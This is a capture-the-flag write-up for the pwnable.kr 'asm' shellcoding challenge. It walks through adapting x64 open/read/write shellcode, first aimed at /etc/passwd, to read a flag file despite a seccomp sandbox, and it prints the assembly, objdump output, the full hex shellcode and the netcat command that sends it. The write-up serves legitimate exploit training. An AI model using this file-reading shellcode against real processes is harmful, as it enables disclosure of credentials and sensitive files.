```bash
asm@pwnable:~$ ls -l
total 28
-rwxr-xr-x 1 root root 13704 Nov 29  2016 asm
-rw-r--r-- 1 root root  1793 Nov 29  2016 asm.c
-rw-r--r-- 1 root root   211 Nov 19  2016 readme
-rw-r--r-- 1 root root    67 Nov 19  2016 this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
asm@pwnable:~$ cat this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong 
this is fake flag file for letting you know the name of flag file.
asm@pwnable:~$ cat readme 
once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.
make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)
asm@pwnable:~$ cat asm.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}
```

Before reading my solution i'd recommend you to walkthrough the code and understand each line written in this code snippet.

This code allows us to input any shellcode we'd like and execute it for us in needed permissions, although there's a catch, The code has some secure computing state rules, basically meaning we can execute only certain system calls, more specifically:
- open
- read
- write
- exit
- exit_group

So this means we cannot execute fun stuff like execve and similar syscalls we usually do in these challenges. 
There's also a `chroot` in the `main` function that puts us in a chroot jail, meaning we cannot access stuff beyond our root directory (which is `/home/asm_pwn`).

So my first trivial idea would be to open our flag file and read it, then write to stdout.

So instead of writing my own shellcode (which i highly recommend you do), i found a written shellcode that does what i need but for '/etc/passwd'.

Assembly:
```Assembly
SECTION .data
SECTION .text
 global main
main:
jmp _push_filename
  
_readfile:
; syscall open file
pop rdi ; pop path value
; NULL byte fix
xor byte [rdi + 11], 0x41
  
xor rax, rax
add al, 2
xor rsi, rsi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff; size to read
xor rax, rax
syscall
  
; syscall write to stdout
xor rdi, rdi
add dil, 1 ; set stdout fd = 1
mov rdx, rax
xor rax, rax
add al, 1
syscall
  
; syscall exit
xor rax, rax
add al, 60
syscall
  
_push_filename:
call _readfile
path: db "/etc/passwdA"
```

Shellcode:
```
\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41
```

So after understanding this snippet of assembly instructions we need to change 2 things:
- the `path` string
- 2nd instruction in `_readfile` which is `xor byte [rdi + 11], 0x41`

So the first one is obvious but why the second?

Well the original author of this added an extra upper 'A' to the end of `path`, then `_readline` replaces this with a NULL-byte so the `open` syscall will know when to finish reading. It's done by xoring the character in index 11 in `path`, so we need to modify it to be the length of `/home/asm_pwn/this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong` which is 245.

<i> P.S: Don't forget to add an uppercase 'A' to the end of `path`</i>  

So the updated assembly should look like this:
```Assembly
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
SECTION .data
SECTION .text
 global main
main:
jmp _push_filename
  
_readfile:
; syscall open file
pop rdi ; pop path value
; NULL byte fix
xor byte [rdi + 245], 0x41
  
xor rax, rax
add al, 2
xor rsi, rsi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff; size to read
xor rax, rax
syscall
  
; syscall write to stdout
xor rdi, rdi
add dil, 1 ; set stdout fd = 1
mov rdx, rax
xor rax, rax
add al, 1
syscall
  
; syscall exit
xor rax, rax
add al, 60
syscall
  
_push_filename:
call _readfile
path: db "/home/asm_pwn/this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000
000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ongA"
```

Great, let's the shellcode of this (`a.asm` is the updated code):
```bash
tom/tmp/try | [0] 
$ nasm -f elf64 -g a.asm 
tom/tmp/try | [0] 
$ gcc -g a.o -o a
tom/tmp/try | [0] 
$ objdump -d ./a

./a:     file format elf64-x86-64

[....]

0000000000001130 <main>:
    1130:	eb 42                	jmp    1174 <_push_filename>

0000000000001132 <_readfile>:
    1132:	5f                   	pop    %rdi
    1133:	80 b7 f5 00 00 00 41 	xorb   $0x41,0xf5(%rdi)
    113a:	48 31 c0             	xor    %rax,%rax
    113d:	04 02                	add    $0x2,%al
    113f:	48 31 f6             	xor    %rsi,%rsi
    1142:	0f 05                	syscall 
    1144:	66 81 ec ff 0f       	sub    $0xfff,%sp
    1149:	48 8d 34 24          	lea    (%rsp),%rsi
    114d:	48 89 c7             	mov    %rax,%rdi
    1150:	48 31 d2             	xor    %rdx,%rdx
    1153:	66 ba ff 0f          	mov    $0xfff,%dx
    1157:	48 31 c0             	xor    %rax,%rax
    115a:	0f 05                	syscall 
    115c:	48 31 ff             	xor    %rdi,%rdi
    115f:	40 80 c7 01          	add    $0x1,%dil
    1163:	48 89 c2             	mov    %rax,%rdx
    1166:	48 31 c0             	xor    %rax,%rax
    1169:	04 01                	add    $0x1,%al
    116b:	0f 05                	syscall 
    116d:	48 31 c0             	xor    %rax,%rax
    1170:	04 3c                	add    $0x3c,%al
    1172:	0f 05                	syscall 

0000000000001174 <_push_filename>:
    1174:	e8 b9 ff ff ff       	call   1132 <_readfile>

0000000000001179 <path>:
    1179:	2f 68 6f 6d 65 2f 61 73 6d 5f 70 77 6e 2f 74 68     /home/asm_pwn/th
    1189:	69 73 5f 69 73 5f 70 77 6e 61 62 6c 65 2e 6b 72     is_is_pwnable.kr
    1199:	5f 66 6c 61 67 5f 66 69 6c 65 5f 70 6c 65 61 73     _flag_file_pleas
    11a9:	65 5f 72 65 61 64 5f 74 68 69 73 5f 66 69 6c 65     e_read_this_file
    11b9:	2e 73 6f 72 72 79 5f 74 68 65 5f 66 69 6c 65 5f     .sorry_the_file_
    11c9:	6e 61 6d 65 5f 69 73 5f 76 65 72 79 5f 6c 6f 6f     name_is_very_loo
    11d9:	6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f     oooooooooooooooo
    11e9:	6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f     oooooooooooooooo
    11f9:	6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f     oooooooooooooooo
    1209:	6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f     oooooooooooooooo
    1219:	6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 30 30 30 30 30 30     oooooooooo000000
    1229:	30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30     0000000000000000
    1239:	30 30 30 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f     000ooooooooooooo
    1249:	6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 30 30 30 30 30 30     oooooooooo000000
    1259:	30 30 30 30 30 30 6f 30 6f 30 6f 30 6f 30 6f 30     000000o0o0o0o0o0
    1269:	6f 30 6f 6e 67 41                                   o0ongA

[....]
```
I've replaced the irrelevant parts of the `objdump` with `[....]`

Our shellcode:
```bash
tom/tmp/try | [130] 
$ objdump -d ./a | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'
[....]
\xeb\x42\x5f\x80\xb7\xf5\x00\x00\x00\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xb9\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x61\x73\x6d\x5f\x70\x77\x6e\x2f\x74\x68\x69\x73\x5f\x69\x73\x5f\x70\x77\x6e\x61\x62\x6c\x65\x2e\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x66\x69\x6c\x65\x5f\x70\x6c\x65\x61\x73\x65\x5f\x72\x65\x61\x64\x5f\x74\x68\x69\x73\x5f\x66\x69\x6c\x65\x2e\x73\x6f\x72\x72\x79\x5f\x74\x68\x65\x5f\x66\x69\x6c\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x73\x5f\x76\x65\x72\x79\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x6e\x67\x41
[....]
```

So let's try running our shellcode!

```bash
$ echo -ne "\xeb\x42\x5f\x80\xb7\xf5\x00\x00\x00\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xb9\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x61\x73\x6d\x5f\x70\x77\x6e\x2f\x74\x68\x69\x73\x5f\x69\x73\x5f\x70\x77\x6e\x61\x62\x6c\x65\x2e\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x66\x69\x6c\x65\x5f\x70\x6c\x65\x61\x73\x65\x5f\x72\x65\x61\x64\x5f\x74\x68\x69\x73\x5f\x66\x69\x6c\x65\x2e\x73\x6f\x72\x72\x79\x5f\x74\x68\x65\x5f\x66\x69\x6c\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x73\x5f\x76\x65\x72\x79\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x6e\x67\x41" | nc pwnable.kr 9026
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode: Mak**************************
```
